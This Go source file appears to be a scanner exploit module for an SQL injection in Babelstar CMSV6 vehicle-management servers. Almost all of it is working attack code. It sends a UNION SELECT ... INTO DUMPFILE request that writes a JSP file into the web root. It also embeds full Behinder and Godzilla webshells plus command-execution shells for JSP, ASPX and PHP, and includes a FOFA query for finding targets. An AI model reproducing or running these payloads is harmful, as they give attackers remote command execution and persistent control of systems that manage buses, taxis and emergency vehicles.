package exploits

import (
    "net/url"
    "strings"

    "git.gobies.org/goby/goscanner/goutils"
    "git.gobies.org/goby/goscanner/jsonvul"
    "git.gobies.org/goby/goscanner/scanconfig"
    "git.gobies.org/goby/httpclient"
)

func init() {
    expJson := `{
    "Name": "Babelstar CMSV6 /point_manage/merge SQL Injection Vulnerability",
    "Description": "<p>Babelstar CMSV6 is widely used in commercial vehicles such as buses, taxis, logistics vehicles, and special vehicles such as police cars and fire trucks to improve vehicle safety and management efficiency, help users understand vehicle operation conditions, and provide effective evidence to support accident investigations and disputes solve.</p><p>There is a SQL injection vulnerability in the name parameter of the /point_manage/merge interface of the Babelstar CMSV6 system. An attacker can enter malicious SQL code, write a malicious executable jsp file, and execute system commands arbitrarily in the server. Attackers exploiting this vulnerability may cause serious harm such as sensitive data leakage in the system, system file tampering, malicious code execution, information leakage, and system privilege escalation. To ensure system and data security, it is necessary to repair vulnerabilities in a timely manner and strengthen system security protection measures. .</p>",
    "Product": "CMSV6",
    "Homepage": "http://www.g-sky.cn/list-70-1.html",
    "DisclosureDate": "2024-05-17",
    "PostTime": "2024-05-20",
    "Author": "csulhaihai@gmail.com",
    "FofaQuery": "body=\"808gps\"",
    "GobyQuery": "body=\"808gps\"",
    "Level": "3",
    "Impact": "<p>An attacker can enter malicious SQL code, write a malicious executable jsp file, and execute system commands arbitrarily in the server. Attackers exploiting this vulnerability may cause serious harm such as sensitive data leakage in the system, system file tampering, malicious code execution, information leakage, and system privilege escalation. To ensure system and data security, it is necessary to repair vulnerabilities in a timely manner and strengthen system security protection measures. .</p>",
    "Recommendation": "<p>The company has released the latest version: <a href=\"http://www.g-sky.cn/\">http://www.g-sky.cn/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "Behinder4,Godzilla,Command,Customize"
        },
        {
            "name": "Command",
            "type": "input",
            "value": "whoami",
            "show": "mode=Command"
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection",
        "File Upload"
    ],
    "VulType": [
        "File Upload",
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "通天星CMSV6 /point_manage/merge SQL 注入漏洞",
            "Product": "CMSV6",
            "Description": "<p>通天星CMSV6广泛应用于公交车、出租车、物流车等商用车辆，以及警车、消防车等特种车辆，提高车辆安全性和管理效率，帮助用户了解车辆运行情况，提供有效证据支持事故调查和纠纷解决。<br></p><p>通天星CMSV6系统的 /point_manage/merge 接口的name参数存在 SQL 注入漏洞。攻击者可通过输入恶意 SQL 代码，写入恶意的可执行jsp文件，在服务器中任意执行系统命令。攻击者利用此漏洞可能会导致系统中的敏感数据泄露、系统文件篡改、恶意代码执行、信息泄露以及系统权限提升等严重危害，为确保系统和数据安全，需要及时修复漏洞、加强系统安全防护措施。<br></p>",
            "Recommendation": "<p>厂商已发布最新版本：<a href=\"http://www.g-sky.cn/\" target=\"_blank\">http://www.g-sky.cn/</a><br></p>",
            "Impact": "<p>攻击者可通过输入恶意 SQL 代码，写入恶意的可执行jsp文件，在服务器中任意执行系统命令。攻击者利用此漏洞可能会导致系统中的敏感数据泄露、系统文件篡改、恶意代码执行、信息泄露以及系统权限提升等严重危害，为确保系统和数据安全，需要及时修复漏洞、加强系统安全防护措施。</p>",
            "VulType": [
                "SQL注入",
                "文件上传"
            ],
            "Tags": [
                "SQL注入",
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Babelstar CMSV6 /point_manage/merge SQL Injection Vulnerability",
            "Product": "CMSV6",
            "Description": "<p>Babelstar CMSV6 is widely used in commercial vehicles such as buses, taxis, logistics vehicles, and special vehicles such as police cars and fire trucks to improve vehicle safety and management efficiency, help users understand vehicle operation conditions, and provide effective evidence to support accident investigations and disputes solve.</p><p>There is a SQL injection vulnerability in the name parameter of the /point_manage/merge interface of the Babelstar CMSV6 system. An attacker can enter malicious SQL code, write a malicious executable jsp file, and execute system commands arbitrarily in the server. Attackers exploiting this vulnerability may cause serious harm such as sensitive data leakage in the system, system file tampering, malicious code execution, information leakage, and system privilege escalation. To ensure system and data security, it is necessary to repair vulnerabilities in a timely manner and strengthen system security protection measures. .<br></p>",
            "Recommendation": "<p>The company has released the latest version: <a href=\"http://www.g-sky.cn/\" target=\"_blank\">http://www.g-sky.cn/</a><br></p>",
            "Impact": "<p>An attacker can enter malicious SQL code, write a malicious executable jsp file, and execute system commands arbitrarily in the server. Attackers exploiting this vulnerability may cause serious harm such as sensitive data leakage in the system, system file tampering, malicious code execution, information leakage, and system privilege escalation. To ensure system and data security, it is necessary to repair vulnerabilities in a timely manner and strengthen system security protection measures. .<br></p>",
            "VulType": [
                "File Upload",
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10953"
}`

    //请求发送
    //请注意：本函数传入的参数为（hostInfo，上传的文件名，上传的文件内容）
    //请注意：模板编写后务必全局替换后面随机字符AAAA
    postOrGet_ASASASASASASASA := func(hostInfo *httpclient.FixUrl, filename string, pocContent string) (filePath string, headerMap map[string]string, err error) {
        //请注意：pocContent字段是原始的shell内容，如果漏洞利用需要对内容进行加密，组装，修改，则需在此处编码
        webshellContent := url.QueryEscape(pocContent)
        filePath = ""
        headerMap = map[string]string{}
        uri := `/point_manage/merge`
        cfg := httpclient.NewPostRequestConfig(uri)
        cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
        cfg.FollowRedirect = false
        cfg.VerifyTls = false
        cfg.Data = `recentUpkeepMileage=5&nextUpkeepMileage=8&updateTime=2023-08-01&remark=test&vehiIdnos=%5B1%2C2%2C3%2C4%5D&nextUpkeepDayStr=3&createTime=2023-08-01&recentUpkeepDayStr=4&upkeepMileage=3&recentUpkeepDay=6&remindDay=7&upkeepStatuStr=2&vehicleId=2&nextUpkeepDay=2023-08-01&upkeepDay=4&checkItem=yes&code=code&type=1&mapId=1&installPlace=place&name=22223' union select/**/1,2,3,4,5,6,7,'` + webshellContent + `' into dumpfile '../../tomcat/webapps/gpsweb/` + filename
        resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
        if err != nil {
            return filePath, headerMap, nil
        }
        if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "服务器异常") {
            filePath = "/" + filename
            return filePath, headerMap, nil
        } else if strings.Contains(resp.Utf8Html, "参数检测到违禁字符串,请修改后再试") {
            return filePath, headerMap, nil
        }
        // 注意：返回值为（最终文件访问路径，访问上传文件的请求头，错误）

        return filePath, headerMap, nil
    }

    ExpManager.AddExploit(NewExploit(
        goutils.GetFileName(),
        expJson,
        func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
            // 此处需要修改：上传的文件类型
            fileType := `jsp`
            // 此处需要修改：如果漏洞存在则设置的VulURL路径
            vulURL := "/point_manage/merge"

            // 函数继承
            uploadFileFunc := postOrGet_ASASASASASASASA

            // 请注意：后续代码为模板代码，非特殊情况，无需更改
            // ----------------------------------------------------------------------------------------------------------------------------------------------------
            // 自删马模板
            generatePOCContent := func(fileType string) (string, string) {
                makeRandom := goutils.RandomHexString(8)
                switch fileType {
                case "jsp":
                    return makeRandom, `<% out.println("` + makeRandom + `"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>`
                case "jspx":
                    return makeRandom, ``
                case "asp":
                    return makeRandom, `<%Response.Write("` + makeRandom + `"):Set fso=CreateObject("Scripting.FileSystemObject"):fso.DeleteFile(Server.MapPath(Request.ServerVariables("SCRIPT_NAME"))) %>`
                case "aspx":
                    return makeRandom, `<%@ Page Language="C#"%><%@ Import Namespace="System.IO"%><% Response.Write("` + makeRandom + `");File.Delete(Server.MapPath(Request.Url.AbsolutePath)); %>`
                case "php":
                    return makeRandom, `<?php echo "` + makeRandom + `";unlink(__FILE__);?>`
                }
                return makeRandom, ``
            }

            // 生成指定文件类型自删除马
            makeRandom, pocContent := generatePOCContent(fileType)
            if pocContent == "" {
                return false
            }

            // 组装文件名
            filename := goutils.RandomHexString(8) + "." + fileType
            // fileURL string,headerMap map[string]string,err error
            // filePath为路径，不是完整的URL地址
            // 文件上传
            filePath, headerMap, err := uploadFileFunc(u, filename, pocContent)
            if err != nil {
                return false
            }
            if filePath == "" {
                return false
            }

            // 文件请求函数
            getRequest := func(hostInfo *httpclient.FixUrl, url string, requestMap map[string]string) (*httpclient.HttpResponse, error) {
                makeRequest := httpclient.NewGetRequestConfig(url)
                makeRequest.VerifyTls = false
                makeRequest.Timeout = 5
                makeRequest.FollowRedirect = false
                if requestMap != nil {
                    for postHeaderKey, postHeaderValue := range requestMap {
                        makeRequest.Header.Store(postHeaderKey, postHeaderValue)
                    }
                }
                return httpclient.DoHttpRequest(hostInfo, makeRequest)
            }

            // 文件请求
            resp, err := getRequest(u, filePath, headerMap)
            if err != nil {
                return false
            }

            // 判断返回值
            if !strings.Contains(resp.Utf8Html, makeRandom) {
                return false
            }

            // 设置VULURL
            ss.VulURL = u.HostInfo + vulURL
            return true
        },

        func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
            var pocContent string
            // 此处需要修改：上传的文件类型
            fileType := `jsp`

            // 函数继承
            uploadFileFunc := postOrGet_ASASASASASASASA

            // 请注意，后续代码为模板固化，正常情况下均无需修改
            // ----------------------------------------------------------------------------------------------------------------------------------------------------
            // 木马模板
            generatePOCContent := func(fileName, fileType string) string {
                switch fileName {
                case "Behinder4":
                    switch fileType {
                    case "txt":
                        return "传输协议: default_xor \nWebShell tool: Behinder 4 \n"
                    case "jsp":
                        return `<%@page import="java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*" %><%!private byte[] Decrypt(byte[] data) throws Exception{String key="e45e329feb5d925b";for (int i = 0; i < data.length; i++) {data[i] = (byte) ((data[i]) ^ (key.getBytes()[i + 1 & 15]));}return data;}%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){ByteArrayOutputStream bos = new ByteArrayOutputStream();byte[] buf = new byte[512];int length=request.getInputStream().read(buf);while (length>0){byte[] data= Arrays.copyOfRange(buf,0,length);bos.write(data);length=request.getInputStream().read(buf);}out.clear();out=pageContext.pushBody();new U(this.getClass().getClassLoader()).g(Decrypt(bos.toByteArray())).newInstance().equals(pageContext);}%>`
                    default:
                        return ``
                    }
                case "Godzilla":
                    switch fileType {
                    case "jsp":
                        return `<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}%>`
                    case "jsptxt":
                        return "密码：pass  向量：key  加密器：JAVA_AES_BASE64"
                    case "jspx":
                        return `<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2"><jsp:declaration> String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }</jsp:declaration><jsp:scriptlet>try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}</jsp:scriptlet></jsp:root>`
                    case "jspxtxt":
                        return `密码：pass  向量：key  加密器：JAVA_AES_BASE64\nWebShell tool: Godzilla`
                    case "asp":
                        return `<%Set bypassDictionary=Server.CreateObject("Scripting.Dictionary"):Function decryption(content,isBin):dim size,i,result,keySize:keySize=len(key):Set BinaryStream=CreateObject("ADODB.Stream"):BinaryStream.CharSet="iso-8859-1":BinaryStream.Type=2:BinaryStream.Open:if IsArray(content) then:size=UBound(content)+1:For i=1 To size:BinaryStream.WriteText chrw(ascb(midb(content,i,1)) Xor Asc(Mid(key,(i mod keySize)+1,1))):Next:end if:BinaryStream.Position=0:if isBin then:BinaryStream.Type=1:decryption=BinaryStream.Read():else:decryption=BinaryStream.ReadText():end if:End Function:key="3c6e0b8a9c15224a":content=Request.BinaryRead(Request.TotalBytes):if not IsEmpty(content) then:if IsEmpty(Session("payload")) then:content=decryption(content,false):Session("payload")=content:response.End:else:content=decryption(content,true):bypassDictionary.Add "payload",Session("payload"):Execute(bypassDictionary("payload")):result=run(content):if not IsEmpty(result) then:response.BinaryWrite decryption(result,true):end if:end if:end if%>`
                    case "asptxt":
                        return `密码：pass  向量：key  加密器：ASP_XOR_RAW`
                    case "aspx":
                        return `<%@ WebService Language="C#" Class="WebService1" %>public class WebService1 : System.Web.Services.WebService{[System.Web.Services.WebMethod(EnableSession=true)]public string pass(string pass){System.Text.StringBuilder stringBuilder=new System.Text.StringBuilder();try{string key="3c6e0b8a9c15224a";string pass_pass="pass";string md5=System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(pass_pass+key))).Replace("-","");byte[] data=System.Convert.FromBase64String(System.Web.HttpUtility.UrlDecode(pass));data=new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key),System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(data,0,data.Length);if(Context.Session["payload"]==null){Context.Session["payload"]=(System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod("Load",new System.Type[]{typeof(byte[])}).Invoke(null,new object[]{data});;}else{object o=((System.Reflection.Assembly)Context.Session["payload"]).CreateInstance("LY");System.IO.MemoryStream outStream=new System.IO.MemoryStream();o.Equals(Context);o.Equals(outStream);o.Equals(data);o.ToString();byte[] r=outStream.ToArray();stringBuilder.Append(md5.Substring(0,16));stringBuilder.Append(System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key),System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r,0,r.Length)));stringBuilder.Append(md5.Substring(16));}}catch(System.Exception){}return stringBuilder.ToString();}}`
                    case "aspxtxt":
                        return `密码：pass  向量：key  加密器：CSHAP_ASMX_AES_BASE64`
                    case "php":
                        return `<?php @session_start();@set_time_limit(0);@error_reporting(0);function encode($D,$K){for($i=0;$i<strlen($D);$i++){$c=$K[$i+1&15];$D[$i]=$D[$i]^$c;}return$D;}$p='pass';$n='payload';$k='3c6e0b8a9c15224a';if(isset($_POST[$p])){$d=encode(base64_decode($_POST[$p]),$k);if(isset($_SESSION[$n])){$p=encode($_SESSION[$n],$k);if(strpos($p,"getBasicsInfo")===false){$p=encode($p,$k);}eval($p);echo substr(md5($p.$k),0,16);echo base64_encode(encode(@run($d),$k));echo substr(md5($p.$k),16);}else{if(strpos($d,"getBasicsInfo")!==false){$_SESSION[$n]=encode($d,$k);}}}?>`
                    case "phptxt":
                        return `密码：pass  向量：key  加密器：PHP_XOR_BASE64`
                    default:
                        return ``
                    }
                case "Command":
                    switch fileType {
                    case "jsp":
                        return `<%@ page import="java.util.*,java.io.*,java.net.*"%><%if (request.getParameter("cmd") != null) {Process p = Runtime.getRuntime().exec("cmd.exe /c " + request.getParameter("cmd"));OutputStream os = p.getOutputStream();InputStream in = p.getInputStream();DataInputStream dis = new DataInputStream(in);String disr = dis.readLine();while ( disr != null ) {out.println(disr); disr = dis.readLine(); }} java.io.File g=new java.io.File(application.getRealPath(request.getServletPath()));g.delete();%>`
                    case "jspx":
                        return ``
                    case "asp":
                        return ``
                    case "aspx":
                        return `<%@ Page Language="C#" %><%@ Import Namespace="System.IO"%><% using (System.Diagnostics.Process process = new System.Diagnostics.Process()){process.StartInfo.FileName = Environment.GetEnvironmentVariable("ComSpec")??"/bin/sh";process.StartInfo.Arguments = "/c \"" + System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(Request.QueryString["cmd"])) + "\"";process.StartInfo.RedirectStandardOutput = true;process.StartInfo.UseShellExecute = false;process.Start();Response.Write(Server.HtmlEncode(System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(process.StandardOutput.ReadToEnd()))));}File.Delete(Server.MapPath(Request.Url.AbsolutePath));%>`
                    case "php":
                        return `<?php if(isset($_GET['cmd'])){$cmd=base64_decode($_GET['cmd']);echo base64_encode(shell_exec($cmd));unlink(__FILE__);} ?>`
                    default:
                        return ``
                    }
                case "Customize":
                    switch fileType {
                    default:
                        return goutils.B2S(ss.Params["Customize"])
                    }
                default:
                    return ``
                }
            }

            pocContent = generatePOCContent(goutils.B2S(ss.Params["mode"]), fileType)

            // 组装文件名
            filename := goutils.RandomHexString(8) + "." + fileType

            // fileURL string,headerMap map[string]string,err error
            // filePath为路径，不是完整的URL地址
            // 文件上传
            filePath, headerMap, err := uploadFileFunc(expResult.HostInfo, filename, pocContent)
            if err != nil {
                expResult.Success = false
                expResult.Output = err.Error()
                return expResult
            }

            if filePath == "" {
                expResult.Success = false
                expResult.Output = err.Error()
                return expResult
            }

            // 文件请求函数
            getRequest := func(hostInfo *httpclient.FixUrl, url string, requestMap map[string]string) (*httpclient.HttpResponse, error) {
                makeRequest := httpclient.NewGetRequestConfig(url)
                makeRequest.VerifyTls = false
                makeRequest.Timeout = 5
                makeRequest.FollowRedirect = false
                if requestMap != nil {
                    for postHeaderKey, postHeaderValue := range requestMap {
                        makeRequest.Header.Store(postHeaderKey, postHeaderValue)
                    }
                }
                return httpclient.DoHttpRequest(hostInfo, makeRequest)
            }

            // 结果返回封装(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig[前两个参数固定], 最终访问文件地址, 命令执行命令(选填))
            switch goutils.B2S(ss.Params["mode"]) {
            case "Behinder4":
                expResult.Success = true
                expResult.Output += "WebShell URL: " + expResult.HostInfo.FixedHostInfo + filePath + "\n"
                expResult.Output += generatePOCContent("Behinder4", "txt")
                return expResult
            case "Godzilla":
                expResult.Success = true
                expResult.Output += "WebShell URL: " + expResult.HostInfo.FixedHostInfo + filePath + "\n"
                expResult.Output += generatePOCContent("Godzilla", fileType+"txt")
                return expResult
            case "Command":
                getResult, err := getRequest(expResult.HostInfo, expResult.HostInfo.FixedHostInfo+filePath+`?cmd=`+goutils.B2S(ss.Params["Command"]), headerMap)
                if err != nil || strings.Contains(getResult.Utf8Html, "error") || strings.Contains(getResult.Utf8Html, "Error") {
                    expResult.Success = false
                    expResult.Output = err.Error()
                    return expResult
                } else {
                    expResult.Success = true
                    tmpresult := strings.Split(getResult.Utf8Html, "1234567")
                    if len(tmpresult) > 1 {
                        expResult.Output += "Command Result: \n" + tmpresult[1]
                    } else {
                        expResult.Output += "Command Result: \nExecution failed!"
                    }
                    return expResult
                }
            case "Customize":
                expResult.Success = true
                expResult.Output += "Customize Upload File URL: " + expResult.HostInfo.FixedHostInfo + filePath + "\n"
                return expResult
            default:
                expResult.Success = false
                expResult.Output = err.Error()
                return expResult
            }
        }))
}
